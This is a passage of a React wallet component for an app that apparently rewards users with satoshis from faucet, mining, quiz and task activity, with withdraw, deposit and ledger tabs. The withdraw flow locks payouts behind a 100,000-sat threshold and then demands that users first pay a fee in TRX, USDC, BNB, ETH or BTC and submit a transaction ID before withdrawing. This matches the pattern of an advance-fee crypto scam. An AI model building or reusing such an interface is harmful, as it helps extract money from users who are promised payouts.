                                  !paymentSentConfirmed || !paymentTxHash.trim()
                                    ? 'bg-neutral-800 text-neutral-500 border border-neutral-700/60 cursor-not-allowed'
                                    : 'bg-amber-500 hover:bg-amber-400 text-neutral-950 shadow-md shadow-amber-500/20 cursor-pointer active:scale-[0.99]'
                                }`}
                              >
                                {isVerifyingPayment ? (
                                  <>
                                    <RefreshCw className="h-4 w-4 animate-spin" />
                                    <span>{paymentVerificationStepText || 'Verifying Block Confirmations...'}</span>
                                  </>
                                ) : !paymentSentConfirmed || !paymentTxHash.trim() ? (
                                  <>
                                    <Lock className="h-3.5 w-3.5 text-neutral-500" />
                                    <span>Pay {selectedPaymentInfo.requiredAmount} & Enter TXID First</span>
                                  </>
                                ) : (
                                  <>
                                    <Check className="h-4 w-4" />
                                    <span>Confirm {selectedPaymentInfo.symbol} Payment</span>
                                  </>
                                )}
                              </button>
                            </div>
                          </div>
                        )}
                      </div>
                    )}
                  </div>
                )}

                <div className="space-y-2">
                  <div className="flex justify-between items-center text-xs">
                    <label className="text-neutral-300 font-medium">Amount to Withdraw</label>
                    <div className="flex items-center gap-2">
                      <span className="text-neutral-400 text-xs">
                        Available: <span className="font-mono font-semibold text-neutral-100">{formatSats(balance)} Sats</span>
                      </span>
                      <button
                        type="button"
                        onClick={() => {
                          const target = balance >= 100000 ? balance : 100000;
                          setWithdrawAmount(target.toString());
                          setWithdrawMemo(`${formatSats(target)} Satoshis Instant Payout`);
                        }}
                        className="rounded-md bg-amber-500/20 hover:bg-amber-500/30 text-amber-300 px-2 py-0.5 text-xs font-mono font-bold border border-amber-500/40 active:scale-95 transition-all cursor-pointer shadow-sm shadow-amber-500/10"
                        title="Set to Available"
                      >
                        MAX
                      </button>
                    </div>
                  </div>

                  <div className="flex items-center gap-2">
                    <input
                      type="text"
                      inputMode="numeric"
                      value={withdrawAmount}
                      onChange={(e) => {
                        const clean = e.target.value.replace(/[^0-9]/g, '');
                        setWithdrawAmount(clean);
                        setWithdrawError(null);
                      }}
                      placeholder="100000"
                      className="w-full rounded-xl border border-neutral-800 bg-neutral-900/60 px-3.5 py-2.5 font-mono text-sm text-neutral-100 focus:border-amber-500 focus:outline-none"
                    />
                    <div className="rounded-xl border border-neutral-800 bg-neutral-900/80 px-3 py-2.5 text-xs font-mono text-neutral-400 whitespace-nowrap">
                      ~{satsToUsd(parsedWithdrawAmount, btcPriceUsd)}
                    </div>
                  </div>

                  {/* Preset Button */}
                  <div className="flex flex-wrap items-center gap-2 pt-1">
                    <button
                      type="button"
                      onClick={() => {
                        setWithdrawAmount('100000');
                        setWithdrawMemo('100,000 Satoshis Instant Payout');
                      }}
                      className={`flex items-center gap-1.5 rounded-lg border px-3.5 py-1.5 text-xs font-mono font-semibold transition-all cursor-pointer ${
                        parsedWithdrawAmount === 100000
                          ? 'border-amber-500 bg-amber-500/25 text-amber-300 shadow-sm shadow-amber-500/10'
                          : 'border-neutral-700 bg-neutral-800/80 text-neutral-300 hover:border-amber-500/40 hover:text-amber-300'
                      }`}
                    >
                      <Zap className="h-3.5 w-3.5 fill-amber-400 text-amber-400" />
                      <span>100,000 Instant</span>
                    </button>
                  </div>

                  {/* 100,000 Sats Threshold Indicator */}
                  {balance < 100000 ? (
                    <div className="rounded-xl border border-amber-500/30 bg-amber-500/10 p-3 space-y-2">
                      <div className="flex items-center justify-between text-xs font-medium">
                        <span className="text-amber-300 flex items-center gap-1.5">
                          <Lock className="h-3.5 w-3.5" />
                          <span>100,000 Sats Threshold Required</span>
                        </span>
                        <span className="font-mono text-neutral-300">
                          {formatSats(balance)} / 100,000 Sats ({Math.min(100, (balance / 100000) * 100).toFixed(1)}%)
                        </span>
                      </div>
                      <div className="w-full h-1.5 bg-neutral-800 rounded-full overflow-hidden">
                        <div
                          className="h-full bg-gradient-to-r from-amber-500 to-emerald-400 rounded-full transition-all duration-500"
                          style={{ width: `${Math.min(100, (balance / 100000) * 100)}%` }}
                        />
                      </div>
                      <p className="text-[11px] text-neutral-400">
                        Little amounts cannot be withdrawn. Once your balance reaches <strong>100,000 Sats</strong>, withdrawal to <strong>{USER_INVOICE_ADDRESS.slice(0, 12)}...</strong> will unlock immediately.
                      </p>
                    </div>
                  ) : (
                    <div className="rounded-lg border border-emerald-500/30 bg-emerald-500/10 p-2 text-xs text-emerald-300 flex items-center gap-1.5 font-medium">
                      <Check className="h-3.5 w-3.5 text-emerald-400" />
                      <span>Threshold reached ({formatSats(balance)} Sats)! 100,000 Instant withdrawal to {USER_INVOICE_ADDRESS.slice(0, 10)}... is unlocked.</span>
                    </div>
                  )}
                </div>

                <div className="space-y-1.5">
                  <label className="text-xs text-neutral-300 font-medium">
                    Payment Memo (Optional)
                  </label>
                  <input
                    type="text"
                    value={withdrawMemo}
                    onChange={(e) => setWithdrawMemo(e.target.value)}
                    className="w-full rounded-xl border border-neutral-800 bg-neutral-900/60 px-3.5 py-2 text-xs text-neutral-100 focus:border-amber-500 focus:outline-none"
                  />
                </div>

                {withdrawError && (
                  <div className="rounded-lg bg-red-500/10 border border-red-500/30 p-2.5 text-xs text-red-300">
                    {withdrawError}
                  </div>
                )}

                <button
                  onClick={handleWithdraw}
                  disabled={isProcessing || !isWithdrawReady || !isPaymentVerified || parsedWithdrawAmount < 100000 || parsedWithdrawAmount > balance}
                  className={`w-full rounded-xl py-3.5 text-xs font-bold transition-all shadow-lg flex items-center justify-center gap-2 ${
                    !isWithdrawReady
                      ? 'bg-neutral-800 text-neutral-500 border border-neutral-700/60 cursor-not-allowed'
                      : !isPaymentVerified
                      ? 'bg-neutral-800 text-amber-300 border border-amber-500/40 cursor-not-allowed'
                      : 'bg-emerald-500 hover:bg-emerald-400 text-neutral-950 hover:scale-[1.01] active:scale-[0.99] shadow-emerald-500/20 cursor-pointer'
                  }`}
                >
                  {!isWithdrawReady ? (
                    <>
                      <Lock className="h-4 w-4 text-neutral-500" />
                      <span>Locked: Reach 100,000 Sats to Withdraw (Have {formatSats(balance)} Sats)</span>
                    </>
                  ) : !isPaymentVerified ? (
                    <>
                      <Lock className="h-4 w-4 text-amber-400" />
                      <span>Must Pay Fee First Above (TRX, USDC, BNB, ETH, BTC) to Withdraw</span>
                    </>
                  ) : (
                    <>
                      <Zap className="h-4 w-4 fill-current text-neutral-950" />
                      <span>
                        {isProcessing ? 'Routing via Bitcoin Network...' : `Send ${formatSats(parsedWithdrawAmount)} Satoshis to Invoice`}
                      </span>
                    </>
                  )}
                </button>
              </div>
            )}
          </div>
        )}

        {/* Tab 2: Deposit / Invoice (Multi-Currency: BTC, TRX, USDC, BNB, ETH, Lightning) */}
        {activeTab === 'receive' && (
          <div className="space-y-5">
            {/* Mode Selector */}
            <div className="flex items-center gap-1.5 border-b border-neutral-800 pb-3 text-xs overflow-x-auto no-scrollbar">
              {(['BTC', 'TRX', 'USDC', 'BNB', 'ETH'] as const).map((currId) => {
                const isActive = depositCurrency === currId;
                return (
                  <button
                    key={currId}
                    type="button"
                    onClick={() => setDepositCurrency(currId)}
                    className={`flex items-center gap-1 px-3 py-1.5 rounded-lg font-medium transition-colors cursor-pointer shrink-0 font-mono text-xs ${
                      isActive
                        ? 'bg-amber-500/20 text-amber-300 border border-amber-500/40 font-bold'
                        : 'text-neutral-400 hover:text-neutral-200 border border-transparent'
                    }`}
                  >
                    <span>{currId}</span>
                  </button>
                );
              })}
              <button
                type="button"
                onClick={() => setDepositCurrency('lightning')}
                className={`flex items-center gap-1 px-3 py-1.5 rounded-lg font-medium transition-colors cursor-pointer shrink-0 text-xs ${
                  depositCurrency === 'lightning'
                    ? 'bg-amber-500/20 text-amber-300 border border-amber-500/40 font-bold'
                    : 'text-neutral-400 hover:text-neutral-200 border border-transparent'
                }`}
              >
                <Zap className="h-3.5 w-3.5" />
                <span>Lightning BOLT11</span>
              </button>
            </div>

            {/* Mode: Crypto Deposits (BTC, TRX, USDC, BNB, ETH) */}
            {depositCurrency !== 'lightning' && (() => {
              const activeDepositInfo = PAYMENT_CURRENCIES.find((c) => c.id === depositCurrency) || PAYMENT_CURRENCIES[0];
              const qrUrl = paymentQrUrls[activeDepositInfo.id] || personalQrUrl;
              return (
                <div className="rounded-xl border border-neutral-800 bg-neutral-900/40 p-5 space-y-4 text-center">
                  <div className="text-xs font-semibold text-neutral-200 flex items-center justify-center gap-1.5">
                    <span className="h-2 w-2 rounded-full bg-emerald-400" />
                    <span>Official {activeDepositInfo.name} ({activeDepositInfo.network}) Deposit</span>
                  </div>

                  {/* Real QR Code */}
                  <div className="mx-auto w-44 h-44 bg-white p-2.5 rounded-2xl shadow-xl flex items-center justify-center">
                    {qrUrl ? (
                      <img
                        src={qrUrl}
                        alt={`${activeDepositInfo.name} Deposit QR`}
                        className="w-full h-full object-contain"
                      />
                    ) : (
                      <div className="animate-pulse text-xs text-neutral-500 font-mono">Generating QR...</div>
                    )}
                  </div>

                  {/* Full Address Display */}
                  <div className="space-y-1">
                    <div className="text-[11px] text-neutral-500 font-mono uppercase tracking-wider">
                      {activeDepositInfo.name} ({activeDepositInfo.network}) Address
                    </div>
                    <div className="p-3 rounded-xl bg-neutral-950 border border-neutral-800 font-mono text-xs text-amber-300 break-all select-all">
                      {activeDepositInfo.address}
                    </div>
                  </div>

                  <div className="flex flex-wrap items-center justify-center gap-2.5 pt-1">
                    <button
                      onClick={() => handleCopy(activeDepositInfo.address, activeDepositInfo.id)}
                      className="flex items-center gap-1.5 rounded-xl border border-neutral-700 bg-neutral-800 hover:bg-neutral-700 px-4 py-2.5 text-xs font-semibold text-neutral-100 transition-colors cursor-pointer"
                    >
                      {copiedText === activeDepositInfo.id ? <Check className="h-4 w-4 text-emerald-400" /> : <Copy className="h-4 w-4" />}
                      <span>{copiedText === activeDepositInfo.id ? 'Address Copied!' : 'Copy Address'}</span>
                    </button>

                    <button
                      onClick={() => handleShareAddress()}
                      className="flex items-center gap-1.5 rounded-xl border border-neutral-700 bg-neutral-800 hover:bg-neutral-700 px-3.5 py-2.5 text-xs font-semibold text-neutral-200 transition-colors cursor-pointer"
                    >
                      <Share2 className="h-4 w-4 text-amber-400" />
                      <span>Share</span>
                    </button>

                    <button
                      onClick={handleCheckMempool}
                      disabled={isCheckingMempool}
                      className="flex items-center gap-1.5 rounded-xl border border-amber-500/40 bg-amber-500/15 hover:bg-amber-500/25 px-4 py-2.5 text-xs font-semibold text-amber-300 transition-colors cursor-pointer disabled:opacity-50"
                    >
                      <RefreshCw className={`h-4 w-4 ${isCheckingMempool ? 'animate-spin' : ''}`} />
                      <span>{isCheckingMempool ? 'Scanning Network...' : 'Check Network Status'}</span>
                    </button>
                  </div>

                  {mempoolNotice && (
                    <div className="rounded-xl border border-emerald-500/30 bg-emerald-500/10 p-3 text-xs text-emerald-300 flex items-center justify-center gap-2 font-mono">
                      <Activity className="h-4 w-4 text-emerald-400 shrink-0" />
                      <span>{mempoolNotice}</span>
                    </div>
                  )}

                  <div className="rounded-xl border border-neutral-800/80 bg-neutral-950/60 p-3 text-[11px] text-neutral-400 text-left space-y-1">
                    <div className="font-semibold text-neutral-300 flex items-center justify-between">
                      <span>Network: {activeDepositInfo.network}</span>
                      <a
                        href={activeDepositInfo.explorerUrl}
                        target="_blank"
                        rel="noopener noreferrer"
                        className="text-amber-400 hover:underline flex items-center gap-1 text-[10px] font-mono"
                      >
                        <span>Block Explorer</span>
                        <ExternalLink className="h-3 w-3" />
                      </a>
                    </div>
                    <p>
                      Send {activeDepositInfo.symbol} strictly via {activeDepositInfo.network}. Transfers will automatically confirm on-chain and credit your account balance.
                    </p>
                  </div>
                </div>
              );
            })()}

            {/* Mode 2: Dynamic Lightning Invoice */}
            {depositCurrency === 'lightning' && (
              <div className="space-y-4">
                <div className="space-y-2">
                  <label className="text-xs text-neutral-300 font-medium">
                    Deposit Satoshis (Generate BOLT11 Invoice)
                  </label>
                  <div className="flex items-center gap-2">
                    <input
                      type="number"
                      min="10"
                      max="100000"
                      value={receiveAmount}
                      onChange={(e) => setReceiveAmount(Math.max(1, parseInt(e.target.value) || 1))}
                      className="w-full rounded-xl border border-neutral-800 bg-neutral-900/60 px-3.5 py-2.5 font-mono text-xs text-neutral-100 focus:border-amber-500 focus:outline-none"
                    />
                    <button
                      onClick={handleGenerateInvoice}
                      className="rounded-xl bg-amber-500 hover:bg-amber-400 px-4 py-2.5 text-xs font-bold text-neutral-950 whitespace-nowrap transition-colors cursor-pointer"
                    >
                      Create Lightning Invoice
                    </button>
                  </div>
                </div>

                {generatedInvoice && (
                  <div className="rounded-xl border border-neutral-800 bg-neutral-900/40 p-4 space-y-4 text-center">
                    <div className="mx-auto w-44 h-44 bg-white p-2.5 rounded-2xl shadow-xl flex items-center justify-center">
                      {lightningQrUrl ? (
                        <img
                          src={lightningQrUrl}
                          alt="Lightning Invoice QR"
                          className="w-full h-full object-contain"
                        />
                      ) : (
                        <div className="animate-pulse text-xs text-neutral-500 font-mono">Generating QR...</div>
                      )}
                    </div>

                    <div className="text-xs font-mono text-neutral-400 break-all bg-neutral-950 p-2.5 rounded-lg border border-neutral-800">
                      {generatedInvoice}
                    </div>

                    <div className="flex flex-wrap items-center justify-center gap-3">
                      <button
                        onClick={() => handleCopy(generatedInvoice, 'bolt11')}
                        className="flex items-center gap-1.5 rounded-lg border border-neutral-700 bg-neutral-800 px-4 py-2 text-xs font-medium text-neutral-200 hover:bg-neutral-700 transition-colors cursor-pointer"
                      >
                        {copiedText === 'bolt11' ? <Check className="h-3.5 w-3.5 text-emerald-400" /> : <Copy className="h-3.5 w-3.5" />}
                        <span>{copiedText === 'bolt11' ? 'Invoice Copied' : 'Copy Invoice'}</span>
                      </button>

                      <button
                        onClick={handleConfirmLightningPayment}
                        className="flex items-center gap-1.5 rounded-lg bg-emerald-600 hover:bg-emerald-500 px-4 py-2 text-xs font-semibold text-white transition-colors cursor-pointer shadow-md shadow-emerald-600/20 active:scale-95"
                      >
                        <CheckCircle2 className="h-3.5 w-3.5" />
                        <span>Confirm Payment Received</span>
                      </button>
                    </div>
                  </div>
                )}
              </div>
            )}
          </div>
        )}

        {/* Tab 3: Ledger */}
        {activeTab === 'ledger' && (
          <div className="space-y-4">
            {/* Wallet Overview Card */}
            <div className="rounded-xl border border-neutral-800 bg-neutral-900/60 p-4 flex flex-col sm:flex-row items-start sm:items-center justify-between gap-3">
              <div>
                <div className="text-[11px] font-mono text-neutral-400 uppercase tracking-wider">Wallet Balance</div>
                <div className="flex items-baseline gap-2 mt-0.5">
                  <span className="text-xl font-bold font-mono text-amber-400">{formatSats(balance)} Sats</span>
                  <span className="text-xs text-neutral-400 font-mono">~{satsToUsd(balance, btcPriceUsd)}</span>
                </div>
              </div>
              <div className="flex items-center gap-2">
                <button
                  type="button"
                  onClick={() => {
                    setWithdrawReceipt(null);
                    setActiveTab('withdraw');
                  }}
                  className="rounded-lg bg-amber-500/20 hover:bg-amber-500/30 text-amber-300 border border-amber-500/40 px-3 py-1.5 text-xs font-semibold flex items-center gap-1.5 transition-colors cursor-pointer"
                >
                  <ArrowUpRight className="h-3.5 w-3.5" />
                  <span>Withdraw</span>
                </button>
                <button
                  type="button"
                  onClick={() => setActiveTab('receive')}
                  className="rounded-lg bg-emerald-500/20 hover:bg-emerald-500/30 text-emerald-300 border border-emerald-500/40 px-3 py-1.5 text-xs font-semibold flex items-center gap-1.5 transition-colors cursor-pointer"
                >
                  <ArrowDownLeft className="h-3.5 w-3.5" />
                  <span>Deposit</span>
                </button>
              </div>
            </div>

            <div className="flex flex-wrap items-center justify-between gap-2">
              <div className="flex items-center gap-1 bg-neutral-900/80 p-1 rounded-lg border border-neutral-800 text-xs">
                {['all', 'faucet', 'mining', 'quiz', 'task', 'withdrawal'].map((f) => (
                  <button
                    key={f}
                    onClick={() => setLedgerFilter(f)}
                    className={`px-2.5 py-1 rounded capitalize text-[11px] font-medium transition-colors cursor-pointer ${
                      ledgerFilter === f
                        ? 'bg-neutral-800 text-neutral-100 font-semibold'
                        : 'text-neutral-400 hover:text-neutral-200'
                    }`}
                  >
                    {f}
                  </button>
                ))}
              </div>

              <button
                onClick={exportLedgerCsv}
                className="flex items-center gap-1 text-xs text-neutral-400 hover:text-neutral-200 cursor-pointer"
              >
                <Download className="h-3.5 w-3.5" />
                <span>Export CSV</span>
              </button>
            </div>

            <div className="overflow-x-auto max-h-72">
              <table className="w-full text-left text-xs font-mono">
                <thead>
                  <tr className="border-b border-neutral-800 text-neutral-500">
                    <th className="pb-2">DATE</th>
                    <th className="pb-2">TYPE</th>
                    <th className="pb-2">DETAILS</th>
                    <th className="pb-2 text-right">SATS</th>
                  </tr>
                </thead>
                <tbody className="divide-y divide-neutral-900">
                  {filteredTransactions.map((tx) => {
                    const isPositive = tx.amount > 0;
                    return (
                      <tr key={tx.id} className="hover:bg-neutral-900/30">
                        <td className="py-2.5 text-neutral-500 whitespace-nowrap">
                          {new Date(tx.timestamp).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' })}
                        </td>
                        <td className="py-2.5 capitalize text-neutral-400">
                          {tx.type}
                        </td>
                        <td className="py-2.5 text-neutral-300 truncate max-w-[200px] font-sans">
                          {tx.description}
                        </td>
                        <td className={`py-2.5 text-right font-bold tabular-nums whitespace-nowrap ${
                          isPositive ? 'text-emerald-400' : 'text-neutral-400'
                        }`}>
                          {isPositive ? `+${formatSats(tx.amount)}` : formatSats(tx.amount)}
                        </td>
                      </tr>
                    );
                  })}
                </tbody>
              </table>
            </div>
          </div>
        )}
      </div>
    </div>
  );
};
